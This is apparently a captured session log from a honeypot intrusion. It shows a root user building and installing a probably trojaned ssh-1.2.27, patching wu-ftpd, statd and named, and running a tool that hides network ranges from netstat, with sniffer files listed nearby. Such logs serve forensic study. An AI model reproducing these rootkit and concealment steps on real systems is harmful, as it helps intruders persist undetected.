+ssh-1.2.27/gmp-2.0.2-ssh-2/gmp-2.0.2-ssh-2/gmp.info
+ssh-1.2.27/gmp-2.0.2-ssh-2/gmp-2.0.2-ssh-2/gmp.info-1
+ssh-1.2.27/gmp-2.0.2-ssh-2/gmp-2.0.2-ssh-2/gmp.info-2
+ssh-1.2.27/gmp-2.0.2-ssh-2/gmp-2.0.2-ssh-2/gmp.info-3
+ssh-1.2.27/gmp-2.0.2-ssh-2/mp_set_fns.o
+ssh-1.2.27/gmp-2.0.2-ssh-2/gmp-2.0.2-ssh-2.tar.gz
+ssh-1.2.27/gmp-2.0.2-ssh-2/mp_clz_tab.o
+ssh-1.2.27/gmp-2.0.2-ssh-2/version.o
+ssh-1.2.27/gmp-2.0.2-ssh-2/stack-alloc.o
+ssh-1.2.27/gmp-2.0.2-ssh-2/mp_bpl.o
+ssh-1.2.27/gmp-2.0.2-ssh-2/extract-double.o
+ssh-1.2.27/gmp-2.0.2-ssh-2/insert-double.o
+ssh-1.2.27/gmp-2.0.2-ssh-2/libgmp.a
+ssh-1.2.27/gmp-2.0.2-ssh-2/libmp.a
+ssh-1.2.27/zlib-1.0.4/
+ssh-1.2.27/zlib-1.0.4/ChangeLog
+ssh-1.2.27/zlib-1.0.4/INDEX
+ssh-1.2.27/zlib-1.0.4/Makefile.tc
+ssh-1.2.27/zlib-1.0.4/Make_vms.com
+ssh-1.2.27/zlib-1.0.4/Makefile.b32
+ssh-1.2.27/zlib-1.0.4/Makefile.bor
+ssh-1.2.27/zlib-1.0.4/Makefile.dj2
+ssh-1.2.27/zlib-1.0.4/Makefile.in
+ssh-1.2.27/zlib-1.0.4/Makefile.msc
+ssh-1.2.27/zlib-1.0.4/Makefile.riscos
+ssh-1.2.27/zlib-1.0.4/Makefile.sas
+ssh-1.2.27/zlib-1.0.4/Makefile.wat
+ssh-1.2.27/zlib-1.0.4/README
+ssh-1.2.27/zlib-1.0.4/descrip.mms
+ssh-1.2.27/zlib-1.0.4/adler32.c
+ssh-1.2.27/zlib-1.0.4/algorithm.doc
+ssh-1.2.27/zlib-1.0.4/compress.c
+ssh-1.2.27/zlib-1.0.4/configure
+ssh-1.2.27/zlib-1.0.4/crc32.c
+ssh-1.2.27/zlib-1.0.4/deflate.c
+ssh-1.2.27/zlib-1.0.4/deflate.h
+ssh-1.2.27/zlib-1.0.4/infblock.c
+ssh-1.2.27/zlib-1.0.4/example.c
+ssh-1.2.27/zlib-1.0.4/gzio.c
+ssh-1.2.27/zlib-1.0.4/infblock.h
+ssh-1.2.27/zlib-1.0.4/infcodes.c
+ssh-1.2.27/zlib-1.0.4/infcodes.h
+ssh-1.2.27/zlib-1.0.4/inffast.c
+ssh-1.2.27/zlib-1.0.4/inffast.h
+ssh-1.2.27/zlib-1.0.4/inflate.c
+ssh-1.2.27/zlib-1.0.4/inftrees.c
+ssh-1.2.27/zlib-1.0.4/inftrees.h
+ssh-1.2.27/zlib-1.0.4/infutil.c
+ssh-1.2.27/zlib-1.0.4/infutil.h
+ssh-1.2.27/zlib-1.0.4/zlib.def
+ssh-1.2.27/zlib-1.0.4/minigzip.c
+ssh-1.2.27/zlib-1.0.4/trees.c
+ssh-1.2.27/zlib-1.0.4/uncompr.c
+ssh-1.2.27/zlib-1.0.4/zconf.h
+ssh-1.2.27/zlib-1.0.4/zlib.h
+ssh-1.2.27/zlib-1.0.4/zlib.rc
+ssh-1.2.27/zlib-1.0.4/zutil.c
+ssh-1.2.27/zlib-1.0.4/zutil.h
+ssh-1.2.27/zlib-1.0.4/Makefile
+ssh-1.2.27/zlib-1.0.4/adler32.o
+ssh-1.2.27/zlib-1.0.4/compress.o
+ssh-1.2.27/zlib-1.0.4/crc32.o
+ssh-1.2.27/zlib-1.0.4/gzio.o
+ssh-1.2.27/zlib-1.0.4/uncompr.o
+ssh-1.2.27/zlib-1.0.4/deflate.o
+ssh-1.2.27/zlib-1.0.4/trees.o
+ssh-1.2.27/zlib-1.0.4/zutil.o
+ssh-1.2.27/zlib-1.0.4/libz.a
+ssh-1.2.27/zlib-1.0.4/inflate.o
+ssh-1.2.27/zlib-1.0.4/infblock.o
+ssh-1.2.27/zlib-1.0.4/inftrees.o
+ssh-1.2.27/zlib-1.0.4/infcodes.o
+ssh-1.2.27/zlib-1.0.4/infutil.o
+ssh-1.2.27/zlib-1.0.4/inffast.o
+ssh-1.2.27/config.log
+ssh-1.2.27/config.h
+ssh-1.2.27/config.cache
+ssh-1.2.27/config.status
+ssh-1.2.27/Makefile
+ssh-1.2.27/sshd.8
+ssh-1.2.27/ssh.1
+ssh-1.2.27/ssh-1.2.27/
+ssh-1.2.27/ssh-1.2.27/COPYING
+ssh-1.2.27/ssh-1.2.27/README
+ssh-1.2.27/ssh-1.2.27/README.SECURID
+ssh-1.2.27/ssh-1.2.27/README.TIS
+ssh-1.2.27/ssh-1.2.27/README.SECURERPC
+ssh-1.2.27/ssh-1.2.27/README.CIPHERS
+ssh-1.2.27/ssh-1.2.27/README.DEATTACK
+ssh-1.2.27/ssh-1.2.27/INSTALL
+ssh-1.2.27/ssh-1.2.27/TODO
+ssh-1.2.27/ssh-1.2.27/libdes-README
+ssh-1.2.27/ssh-1.2.27/libdes-COPYING
+ssh-1.2.27/ssh-1.2.27/libdes-ARTISTIC
+ssh-1.2.27/ssh-1.2.27/gnu-COPYING-GPL
+ssh-1.2.27/ssh-1.2.27/OVERVIEW
+ssh-1.2.27/ssh-1.2.27/configure
+ssh-1.2.27/ssh-1.2.27/configure.in
+ssh-1.2.27/ssh-1.2.27/config.guess
+ssh-1.2.27/ssh-1.2.27/config.sub
+ssh-1.2.27/ssh-1.2.27/Makefile.in
+ssh-1.2.27/ssh-1.2.27/host_config.sample
+ssh-1.2.27/ssh-1.2.27/config.sample
+ssh-1.2.27/ssh-1.2.27/acconfig.h
+ssh-1.2.27/ssh-1.2.27/config.h.in
+ssh-1.2.27/ssh-1.2.27/server_config.sample
+ssh-1.2.27/ssh-1.2.27/install-sh
+ssh-1.2.27/ssh-1.2.27/make-ssh-known-hosts.pl
+ssh-1.2.27/ssh-1.2.27/RFC.nroff
+ssh-1.2.27/ssh-1.2.27/RFC
+ssh-1.2.27/ssh-1.2.27/rfc-pg.c
+ssh-1.2.27/ssh-1.2.27/ChangeLog
+ssh-1.2.27/ssh-1.2.27/ssh.1.in
+ssh-1.2.27/ssh-1.2.27/ssh-keygen.1
+ssh-1.2.27/ssh-1.2.27/ssh-agent.1
+ssh-1.2.27/ssh-1.2.27/ssh-add.1
+ssh-1.2.27/ssh-1.2.27/scp.1
+ssh-1.2.27/ssh-1.2.27/make-ssh-known-hosts.1.in
+ssh-1.2.27/ssh-1.2.27/sshd.8.in
+ssh-1.2.27/ssh-1.2.27/sshd.c
+ssh-1.2.27/ssh-1.2.27/auth-rhosts.c
+ssh-1.2.27/ssh-1.2.27/auth-passwd.c
+ssh-1.2.27/ssh-1.2.27/auth-rsa.c
+ssh-1.2.27/ssh-1.2.27/auth-rh-rsa.c
+ssh-1.2.27/ssh-1.2.27/pty.c
+ssh-1.2.27/ssh-1.2.27/log-server.c
+ssh-1.2.27/ssh-1.2.27/login.c
+ssh-1.2.27/ssh-1.2.27/hostfile.c
+ssh-1.2.27/ssh-1.2.27/canohost.c
+ssh-1.2.27/ssh-1.2.27/servconf.c
+ssh-1.2.27/ssh-1.2.27/tildexpand.c
+ssh-1.2.27/ssh-1.2.27/serverloop.c
+ssh-1.2.27/ssh-1.2.27/idea.c
+ssh-1.2.27/ssh-1.2.27/rsa.c
+ssh-1.2.27/ssh-1.2.27/randoms.c
+ssh-1.2.27/ssh-1.2.27/md5.c
+ssh-1.2.27/ssh-1.2.27/buffer.c
+ssh-1.2.27/ssh-1.2.27/emulate.c
+ssh-1.2.27/ssh-1.2.27/packet.c
+ssh-1.2.27/ssh-1.2.27/compress.c
+ssh-1.2.27/ssh-1.2.27/xmalloc.c
+ssh-1.2.27/ssh-1.2.27/ttymodes.c
+ssh-1.2.27/ssh-1.2.27/newchannels.c
+ssh-1.2.27/ssh-1.2.27/bufaux.c
+ssh-1.2.27/ssh-1.2.27/authfd.c
+ssh-1.2.27/ssh-1.2.27/authfile.c
+ssh-1.2.27/ssh-1.2.27/crc32.c
+ssh-1.2.27/ssh-1.2.27/rsaglue.c
+ssh-1.2.27/ssh-1.2.27/cipher.c
+ssh-1.2.27/ssh-1.2.27/des.c
+ssh-1.2.27/ssh-1.2.27/match.c
+ssh-1.2.27/ssh-1.2.27/arcfour.c
+ssh-1.2.27/ssh-1.2.27/mpaux.c
+ssh-1.2.27/ssh-1.2.27/userfile.c
+ssh-1.2.27/ssh-1.2.27/signals.c
+ssh-1.2.27/ssh-1.2.27/blowfish.c
+ssh-1.2.27/ssh-1.2.27/deattack.c
+ssh-1.2.27/ssh-1.2.27/ssh.c
+ssh-1.2.27/ssh-1.2.27/sshconnect.c
+ssh-1.2.27/ssh-1.2.27/log-client.c
+ssh-1.2.27/ssh-1.2.27/readconf.c
+ssh-1.2.27/ssh-1.2.27/readpass.c
+ssh-1.2.27/ssh-1.2.27/clientloop.c
+ssh-1.2.27/ssh-1.2.27/ssh-keygen.c
+ssh-1.2.27/ssh-1.2.27/ssh-agent.c
+ssh-1.2.27/ssh-1.2.27/ssh-add.c
+ssh-1.2.27/ssh-1.2.27/scp.c
+ssh-1.2.27/ssh-1.2.27/ssh-askpass.c
+ssh-1.2.27/ssh-1.2.27/memmove.c
+ssh-1.2.27/ssh-1.2.27/snprintf.c
+ssh-1.2.27/ssh-1.2.27/strerror.c
+ssh-1.2.27/ssh-1.2.27/remove.c
+ssh-1.2.27/ssh-1.2.27/random.c
+ssh-1.2.27/ssh-1.2.27/putenv.c
+ssh-1.2.27/ssh-1.2.27/crypt.c
+ssh-1.2.27/ssh-1.2.27/sshsia.c
+ssh-1.2.27/ssh-1.2.27/socketpair.c
+ssh-1.2.27/ssh-1.2.27/auth-kerberos.c
+ssh-1.2.27/ssh-1.2.27/cipher.h
+ssh-1.2.27/ssh-1.2.27/getput.h
+ssh-1.2.27/ssh-1.2.27/pty.h
+ssh-1.2.27/ssh-1.2.27/arcfour.h
+ssh-1.2.27/ssh-1.2.27/compress.h
+ssh-1.2.27/ssh-1.2.27/idea.h
+ssh-1.2.27/ssh-1.2.27/randoms.h
+ssh-1.2.27/ssh-1.2.27/ttymodes.h
+ssh-1.2.27/ssh-1.2.27/authfd.h
+ssh-1.2.27/ssh-1.2.27/crc32.h
+ssh-1.2.27/ssh-1.2.27/includes.h
+ssh-1.2.27/ssh-1.2.27/readconf.h
+ssh-1.2.27/ssh-1.2.27/userfile.h
+ssh-1.2.27/ssh-1.2.27/blowfish.h
+ssh-1.2.27/ssh-1.2.27/des.h
+ssh-1.2.27/ssh-1.2.27/md5.h
+ssh-1.2.27/ssh-1.2.27/rsa.h
+ssh-1.2.27/ssh-1.2.27/version.h
+ssh-1.2.27/ssh-1.2.27/bufaux.h
+ssh-1.2.27/ssh-1.2.27/mpaux.h
+ssh-1.2.27/ssh-1.2.27/servconf.h
+ssh-1.2.27/ssh-1.2.27/xmalloc.h
+ssh-1.2.27/ssh-1.2.27/buffer.h
+ssh-1.2.27/ssh-1.2.27/emulate.h
+ssh-1.2.27/ssh-1.2.27/packet.h
+ssh-1.2.27/ssh-1.2.27/ssh.h
+ssh-1.2.27/ssh-1.2.27/deattack.h
+ssh-1.2.27/ssh-1.2.27/snprintf.h
+ssh-1.2.27/ssh-1.2.27/sshsia.h
+ssh-1.2.27/make-ssh-known-hosts.1
+ssh-1.2.27/ssh.o
+ssh-1.2.27/sshconnect.o
+ssh-1.2.27/log-client.o
+ssh-1.2.27/readconf.o
+ssh-1.2.27/hostfile.o
+ssh-1.2.27/readpass.o
+ssh-1.2.27/tildexpand.o
+ssh-1.2.27/clientloop.o
+ssh-1.2.27/canohost.o
+ssh-1.2.27/idea.o
+ssh-1.2.27/rsa.o
+ssh-1.2.27/randoms.o
+ssh-1.2.27/md5.o
+ssh-1.2.27/buffer.o
+ssh-1.2.27/emulate.o
+ssh-1.2.27/packet.o
+ssh-1.2.27/compress.o
+ssh-1.2.27/xmalloc.o
+ssh-1.2.27/ttymodes.o
+ssh-1.2.27/newchannels.o
+ssh-1.2.27/bufaux.o
+ssh-1.2.27/authfd.o
+ssh-1.2.27/authfile.o
+ssh-1.2.27/crc32.o
+ssh-1.2.27/rsaglue.o
+ssh-1.2.27/cipher.o
+ssh-1.2.27/des.o
+ssh-1.2.27/match.o
+ssh-1.2.27/arcfour.o
+ssh-1.2.27/mpaux.o
+ssh-1.2.27/userfile.o
+ssh-1.2.27/signals.o
+ssh-1.2.27/blowfish.o
+ssh-1.2.27/deattack.o
+ssh-1.2.27/ssh
+ssh-1.2.27/sshd.o
+ssh-1.2.27/auth-rhosts.o
+ssh-1.2.27/auth-passwd.o
+ssh-1.2.27/auth-rsa.o
+ssh-1.2.27/auth-rh-rsa.o
+ssh-1.2.27/pty.o
+ssh-1.2.27/log-server.o
+ssh-1.2.27/login.o
+ssh-1.2.27/servconf.o
+ssh-1.2.27/serverloop.o
+ssh-1.2.27/sshd
+ssh-1.2.27/ssh-keygen.o
+ssh-1.2.27/ssh-keygen
+ssh-1.2.27/ssh-agent.o
+ssh-1.2.27/ssh-agent
+ssh-1.2.27/ssh-add.o
+ssh-1.2.27/ssh-add
+ssh-1.2.27/scp.o
+ssh-1.2.27/scp
+ssh-1.2.27/make-ssh-known-hosts
+rm -f ssh
+gcc -pipe  -o ssh ssh.o sshconnect.o log-client.o readconf.o hostfile.o readpass.o tildexpand.o clientloop.o canohost.o  idea.o rsa.o randoms.o md5.o buffer.o emulate.o packet.o compress.o xmalloc.o ttymodes.o newchannels.o bufaux.o authfd.o authfile.o crc32.o rsaglue.o cipher.o des.o match.o arcfour.o mpaux.o userfile.o signals.o blowfish.o deattack.o  \
+-Lgmp-2.0.2-ssh-2 -lgmp -Lzlib-1.0.4 -lz  -lnsl -lbsd -lcrypt -L/usr/local/lib  -lutil 
+rm -f sshd
+gcc -pipe  -o sshd sshd.o auth-rhosts.o auth-passwd.o auth-rsa.o auth-rh-rsa.o pty.o log-server.o login.o hostfile.o canohost.o servconf.o tildexpand.o serverloop.o  idea.o rsa.o randoms.o md5.o buffer.o emulate.o packet.o compress.o xmalloc.o ttymodes.o newchannels.o bufaux.o authfd.o authfile.o crc32.o rsaglue.o cipher.o des.o match.o arcfour.o mpaux.o userfile.o signals.o blowfish.o deattack.o   \
+-Lgmp-2.0.2-ssh-2 -lgmp -Lzlib-1.0.4 -lz  -lnsl -lbsd -lcrypt -L/usr/local/lib  -lutil 
+rm -f ssh-keygen
+gcc -pipe  -o ssh-keygen ssh-keygen.o log-client.o readpass.o rsa.o randoms.o md5.o buffer.o xmalloc.o authfile.o cipher.o des.o arcfour.o mpaux.o bufaux.o userfile.o signals.o blowfish.o  idea.o -Lgmp-2.0.2-ssh-2 -lgmp -lnsl -lbsd -lcrypt -L/usr/local/lib  -lutil
+rm -f ssh-agent
+gcc -pipe  -o ssh-agent ssh-agent.o log-client.o rsa.o randoms.o md5.o buffer.o xmalloc.o bufaux.o authfd.o authfile.o rsaglue.o cipher.o des.o arcfour.o mpaux.o userfile.o signals.o blowfish.o  idea.o -Lgmp-2.0.2-ssh-2 -lgmp -lnsl -lbsd -lcrypt -L/usr/local/lib  -lutil  
+rm -f ssh-add
+gcc -pipe  -o ssh-add ssh-add.o log-client.o readpass.o rsa.o randoms.o md5.o buffer.o xmalloc.o bufaux.o authfd.o authfile.o cipher.o blowfish.o des.o arcfour.o mpaux.o userfile.o signals.o  idea.o -Lgmp-2.0.2-ssh-2 -lgmp -lnsl -lbsd -lcrypt -L/usr/local/lib  -lutil
+rm -f scp
+gcc -pipe  -o scp scp.o xmalloc.o  -lnsl -lbsd -lcrypt -L/usr/local/lib  -lutil
+rm -f make-ssh-known-hosts
+sed "s#&PERL&#/usr/bin/perl#" <./make-ssh-known-hosts.pl >make-ssh-known-hosts
+chmod +x make-ssh-known-hosts
+umask 022; if test '!' -d /usr/local; then \
+  mkdir /usr/local; fi; \
+if test '!' -d /usr/local; then \
+  mkdir /usr/local; fi; \
+if test '!' -d /etc; then \
+  mkdir /etc; fi; \
+if test '!' -d /usr/local/bin; then \
+  mkdir /usr/local/bin; fi; \
+if test '!' -d /usr/local/sbin; then \
+  mkdir /usr/local/sbin; fi; \
+if test '!' -d /usr/local/man; then \
+  mkdir /usr/local/man; fi; \
+if test '!' -d /usr/local/man/man1; then \
+  mkdir /usr/local/man/man1; fi; \
+if test '!' -d /usr/local/man/man8; then \
+  mkdir /usr/local/man/man8; fi
+Generating 1024 bit host key.
+Initializing random number generator...
+Generating p:  ........++ (distance 162)
+Generating q:  .......................++ (distance 436)
+Computing the keys...
+Testing the keys...
+Key generation complete.
+Your identification has been saved in /etc/ssh_host_key.
+Your public key is:
+1024 37 136068235705641814494812472994687446691420647388102134090536449757345402804108395168198998378571785691576518876265495654696681009843866097923296352072858969948312954316785634048775594618249136996183106467154645927866156657102599333846274766275832861694296225798508912856321663152762376577048479270172482474803 root@apollo.honeyt.edu
+Your public key has been saved in /etc/ssh_host_key.pub
+if test '!' -f /etc/ssh_config; then \
+  /usr/bin/install -c -m 644 -m 0644 ./host_config.sample \
+    /etc/ssh_config; fi
+if test '!' -f /etc/sshd_config; then \
+  cat ./server_config.sample | \
+  sed "s#_ETCDIR_#/etc#g" >/tmp/ssh_inst.$$; \
+  /usr/bin/install -c -m 644 -m 0644 /tmp/ssh_inst.$$ \
+    /etc/sshd_config; \
+  rm -f /tmp/ssh_inst.$$; fi
+rm -f /usr/local/bin/ssh1.old
+chmod 755 /usr/local/bin/ssh1
+chmod: /usr/local/bin/ssh1: No such file or directory
+make: [install] Error 1 (ignored)
+chmod 755 /usr/local/bin/ssh
+chmod: /usr/local/bin/ssh: No such file or directory
+make: [install] Error 1 (ignored)
+mv /usr/local/bin/ssh1 /usr/local/bin/ssh1.old
+mv: /usr/local/bin/ssh1: No such file or directory
+make: [install] Error 1 (ignored)
+/usr/bin/install -c -o root -m 04711 ssh /usr/local/bin/ssh1
+if test -f /usr/local/bin/ssh2; then \
+  echo "Ssh version 2 program found, installation doesn't touch ssh link"; \
+else \
+  rm -f /usr/local/bin/ssh.old; \
+  mv /usr/local/bin/ssh /usr/local/bin/ssh.old ;\
+  ln -s ssh1 /usr/local/bin/ssh ;\
+        fi
+mv: /usr/local/bin/ssh: No such file or directory
+if test "`echo ssh | sed 's,x,x,'`" '!=' ssh; then \
+  rm -f /usr/local/bin/`echo ssh | sed 's,x,x,'`; \
+  ln -s ssh \
+    /usr/local/bin/`echo ssh | sed 's,x,x,'`; fi
+rm -f /usr/local/bin/slogin
+ln -s ssh /usr/local/bin/slogin
+if test "`echo slogin | sed 's,x,x,'`" '!=' slogin; then \
+  rm -f /usr/local/bin/`echo slogin | sed 's,x,x,'`;\
+  ln -s ssh \
+    /usr/local/bin/`echo slogin | sed 's,x,x,'`; fi
+for p in ssh-keygen ssh-agent ssh-add scp  ; do \
+  rm -f /usr/local/bin/${p}1.old ; \
+  mv /usr/local/bin/${p}1 /usr/local/bin/${p}1.old; \
+  /usr/bin/install -c -m 0755 $p /usr/local/bin/${p}1; \
+  if test -f /usr/local/bin/${p}2; then \
+    echo "Ssh version 2 $p utility found, installation doesn't touch $p link"; \
+  else \
+    rm -f /usr/local/bin/$p.old ;\
+    mv /usr/local/bin/$p /usr/local/bin/$p.old ;\
+    ln -s ${p}1 /usr/local/bin/$p ;\
+          fi ;\
+  if test "`echo $p | sed 's,x,x,'`" '!=' $p; then \
+    rm -f /usr/local/bin/`echo $p | sed 's,x,x,'`; \
+    ln -s $p \
+      /usr/local/bin/`echo $p | sed 's,x,x,'`; fi; \
+    /usr/local/bin/`echo ssh | sed 's,x,x,'`; fi
+rm -f /usr/local/bin/slogin
+ln -s ssh /usr/local/bin/slogin
+if test "`echo slogin | sed 's,x,x,'`" '!=' slogin; then \
+  rm -f /usr/local/bin/`echo slogin | sed 's,x,x,'`;\
+  ln -s ssh \
+    /usr/local/bin/`echo slogin | sed 's,x,x,'`; fi
+for p in ssh-keygen ssh-agent ssh-add scp  ; do \
+  rm -f /usr/local/bin/${p}1.old ; \
+  mv /usr/local/bin/${p}1 /usr/local/bin/${p}1.old; \
+  /usr/bin/install -c -m 0755 $p /usr/local/bin/${p}1; \
+  if test -f /usr/local/bin/${p}2; then \
+    echo "Ssh version 2 $p utility found, installation doesn't touch $p link"; \
+  else \
+    rm -f /usr/local/bin/$p.old ;\
+    mv /usr/local/bin/$p /usr/local/bin/$p.old ;\
+    ln -s ${p}1 /usr/local/bin/$p ;\
+          fi ;\
+  if test "`echo $p | sed 's,x,x,'`" '!=' $p; then \
+    rm -f /usr/local/bin/`echo $p | sed 's,x,x,'`; \
+    ln -s $p \
+      /usr/local/bin/`echo $p | sed 's,x,x,'`; fi; \
+done
+mv: /usr/local/bin/ssh-keygen1: No such file or directory
+mv: /usr/local/bin/ssh-keygen: No such file or directory
+mv: /usr/local/bin/ssh-agent1: No such file or directory
+mv: /usr/local/bin/ssh-agent: No such file or directory
+mv: /usr/local/bin/ssh-add1: No such file or directory
+mv: /usr/local/bin/ssh-add: No such file or directory
+mv: /usr/local/bin/scp1: No such file or directory
+mv: /usr/local/bin/scp: No such file or directory
+for p in make-ssh-known-hosts; do \
+  rm -f /usr/local/bin/${p}1.old ; \
+  mv /usr/local/bin/${p}1 /usr/local/bin/${p}1.old; \
+  /usr/bin/install -c -m 644 $p /usr/local/bin/${p}1; \
+  chmod 755 /usr/local/bin/${p}1; \
+  if test -f /usr/local/bin/${p}2; then \
+    echo "Ssh version 2 $p utility found, installation doesn't touch $p link"; \
+  else \
+    rm -f /usr/local/bin/$p.old ;\
+    mv /usr/local/bin/$p /usr/local/bin/$p.old ;\
+    ln -s ${p}1 /usr/local/bin/$p ;\
+          fi ;\
+  if test "`echo $p | sed 's,x,x,'`" '!=' $p; then \
+    rm -f /usr/local/bin/`echo $p | sed 's,x,x,'`; \
+    ln -s $p \
+      /usr/local/bin/`echo $p | sed 's,x,x,'`; fi; \
+done
+mv: /usr/local/bin/make-ssh-known-hosts1: No such file or directory
+mv: /usr/local/bin/make-ssh-known-hosts: No such file or directory
+for p in sshd; do \
+  rm -f /usr/local/sbin/${p}1.old ; \
+  mv /usr/local/sbin/${p}1 /usr/local/sbin/${p}1.old; \
+  /usr/bin/install -c -m 0755 $p /usr/local/sbin/${p}1; \
+  if test -f /usr/local/sbin/${p}2; then \
+    echo "Ssh version 2 $p utility found, installation doesn't touch $p link"; \
+  else \
+    rm -f /usr/local/sbin/$p.old ;\
+    mv /usr/local/sbin/$p /usr/local/sbin/$p.old ;\
+    ln -s ${p}1 /usr/local/sbin/$p ;\
+          fi ;\
+  if test "`echo $p | sed 's,x,x,'`" '!=' $p; then \
+    rm -f /usr/local/sbin/`echo $p | sed 's,x,x,'`;\
+    ln -s $p \
+      /usr/local/sbin/`echo $p | sed 's,x,x,'`; fi;\
+done
+mv: /usr/local/sbin/sshd1: No such file or directory
+mv: /usr/local/sbin/sshd: No such file or directory
+for p in ssh-keygen ssh-agent ssh-add scp ; do \
+  /usr/bin/install -c -m 644 -m 0644 ./$p.1 /usr/local/man/man1/${p}1.1 ; \
+  rm -f /usr/local/man/man1/$p.1 ;\
+  ln -s ${p}1.1 /usr/local/man/man1/$p.1 ;\
+  if test "`echo $p | sed 's,x,x,'`" '!=' $p; then \
+    rm -f /usr/local/man/man1/`echo $p | sed 's,x,x,'`.1;\
+    ln -s ${p}1.1 \
+      /usr/local/man/man1/`echo $p | sed 's,x,x,'`.1; \
+  fi; \
+done
+rm -f /usr/local/man/man1/slogin1.1
+ln -s ssh1.1 /usr/local/man/man1/slogin1.1
+rm -f /usr/local/man/man1/slogin.1
+ln -s ssh.1 /usr/local/man/man1/slogin.1
+if test "`echo slogin.1 | sed 's,x,x,'`" '!=' slogin.1; then \
+  rm -f /usr/local/man/man1/`echo slogin.1 | sed 's,x,x,'`;\
+  ln -s ssh.1 \
+    /usr/local/man/man1/`echo slogin.1 | sed 's,x,x,'`; \
+fi
+for p in ssh make-ssh-known-hosts; do \
+  /usr/bin/install -c -m 644 -m 0644 $p.1 /usr/local/man/man1/${p}1.1 ; \
+  rm -f /usr/local/man/man1/$p.1 ; \
+  ln -s ${p}1.1 /usr/local/man/man1/$p.1 ; \
+  if test "`echo $p | sed 's,x,x,'`" '!=' $p; then \
+    rm -f /usr/local/man/man1/`echo $p | sed 's,x,x,'`.1;\
+    ln -s ${p}1.1 \
+      /usr/local/man/man1/`echo $p | sed 's,x,x,'`.1; \
+  fi; \
+done
+for p in sshd; do \
+  /usr/bin/install -c -m 644 -m 0644 $p.8 /usr/local/man/man8/${p}1.8; \
+  rm -f /usr/local/man/man8/$p.8 ; \
+  ln -s ${p}1.8 /usr/local/man/man8/$p.8 ; \
+  if test "`echo $p | sed 's,x,x,'`" '!=' $p; then \
+    rm -f /usr/local/man/man8/`echo $p | sed 's,x,x,'`.8;\
+    ln -s ${p}1.8 \
+      /usr/local/man/man8/`echo $p | sed 's,x,x,'`.8; fi;\
+done
+done installing sshd
+now restarting
+dont forget to remove the sshd folders
+[root@apollo .Ci]# whereis sshd
+sshd: /usr/local/sbin/sshd
+[root@apollo .Ci]# /usr/local/sbin/sshd/
+[root@apollo .Ci]# 
+[root@apollo .Ci]# ./install-wu
+patching wuftpd
+..
+wu-ftpd                     ##################################################
+..
+finished
+[root@apollo .Ci]#./installstatd
+statd patch
+..
+nfs-utils                   ##################################################
+..
+Restarting NFS file locking services: rpc.lockd lockdsvc: Connection refused
+rpc.statd done.
+[root@apollo .Ci]# dir
+\   find named.tgz       snap
+a.sh  fix needz       snif
+addn  inetd nfs-utils-0.1.9.1-1.i386.rpm  sniff.pid
+addps  install-named  paki       sp.pl
+backup  install-sshd pstree       ssh-1.2.27
+bx  install-sshd1  q       ssh-1.2.27.tar
+chmod-it  install-statd  qs       syslogd
+clean  install-wu rmS       tcp.log
+do  killall scan       wuftpd.rpm
+[root@apollo .Ci]# ./install-named
+bin/
+bin/dig/
+bin/dig/dig
+bin/addr/
+bin/addr/addr
+bin/dnskeygen/
+bin/dnskeygen/dnskeygen
+bin/dnsquery/
+bin/dnsquery/dnsquery
+bin/host/
+bin/host/host
+bin/irpd/
+bin/irpd/irpd
+bin/mkservdb/
+bin/mkservdb/mkservdb
+bin/named/
+bin/named/named
+bin/named-bootconf/
+bin/named-bootconf/named-bootconf
+bin/named-xfer/
+bin/named-xfer/named-xfer
+bin/ndc/
+bin/ndc/ndc
+bin/nslookup/
+bin/nslookup/nslookup.help
+bin/nslookup/nslookup
+bin/nsupdate/
+bin/nsupdate/nsupdate
+bin/install
+install: cannot create regular file `/usr/local/libexec/dnskeygen': No such file or directory
+install: cannot create regular file `/usr/local/libexec/named-xfer': No such file or directory
+install: cannot create regular file `/usr/share/misc/': No such file or directory
+removing old named
+copying new version
+killall -9 named'ing
+named: no process killed
+starting up new named
+ndc: error: name server was not running (warning only)
+new pid is 2965
+checking version
+
+; <<>> DiG 8.2 <<>> version.bind @localhost chaos txt 
+; (1 server found)
+;; res options: init recurs defnam dnsrch
+;; got answer:
+;; ->>HEADER<<- opcode: QUERY, status: NOERROR, id: 6
+;; flags: qr aa rd ra; QUERY: 1, ANSWER: 1, AUTHORITY: 0, ADDITIONAL: 0
+;; QUERY SECTION:
+;;version.bind, type = TXT, class = CHAOS
+
+;; ANSWER SECTION:
+VERSION.BIND.0S CHAOS TXT"8.2.2-P5"
+
+;; Total query time: 1 msec
+;; FROM: apollo.honeyt.edu to SERVER: localhost  127.0.0.1
+;; WHEN: Wed Nov  8 08:54:43 2000
+;; MSG SIZE  sent: 30  rcvd: 63
+
+done
+[root@apollo .Ci]# ;; res options: init recurs defnam dnsrch
+;; got answer:
+;; ->>HEADER<<- opcode: QUERY, status: NOERROR, id: 6
+;; flags: qr aa rd ra; QUERY: 1, ANSWER: 1, AUTHORITY: 0, ADDITIONAL: 0
+;; QUERY SECTION:
+;;version.bind, type = TXT, class = CHAOS
+
+;; ANSWER SECTION:
+VERSION.BIND.0S CHAOS TXT"8.2.2-P5"
+
+;; Total query time: 1 msec
+;; FROM: apollo.honeyt.edu to SERVER: localhost  127.0.0.1
+;; WHEN: Wed Nov  8 08:54:43 2000
+;; MSG SIZE  sent: 30  rcvd: 63
+
+done
+[root@apollo .Ci]# ls
+                              killall
+a.sh                          needz
+addn                          nfs-utils-0.1.9.1-1.i386.rpm
+addps                         paki
+backup                        pstree
+bx                            q
+chmod-it                      qs
+clean                         rmS
+do                            snap
+find                          snif
+fix                           sniff.pid
+inetd                         sp.pl
+install-named                 ssh-1.2.27
+install-sshd                  ssh-1.2.27.tar
+install-sshd1                 syslogd
+install-statd                 wuftpd.rpm
+install-wu
+[root@apollo .Ci]# ./addn
+enter classb to hide in netstat: 65.1
+doing it like they do it on the discovery channel
+added 65.1 to the hidden list
+[root@apollo .Ci]# ./addn
+enter classb to hide in netstat: /usr/local/sbin/sshd
+doing it like they do it on the discovery channel
+added 134518464.134518444 to the hidden list
+[root@apollo .Ci]# ./addn
+enter classb to hide in netstat: 216.149
+doing it like they do it on the discovery channel
+added 216.149 to the hidden list
+[root@apollo .Ci]# ps aux
+USER       PID %CPU %MEM  SIZE   RSS TTY STAT START   TIME COMMAND
+adm1      2389  0.0  0.0  1692     0  ?  SW  14:28   0:00 (bash)
+nobody     358  0.0  0.0  1292    44  ?  S  Nov  5   0:00 (identd)
+nobody     361  0.0  0.0  1292    44  ?  S  Nov  5   0:00 (identd)
+nobody     362  0.0  0.0  1292    44  ?  S  Nov  5   0:00 (identd)
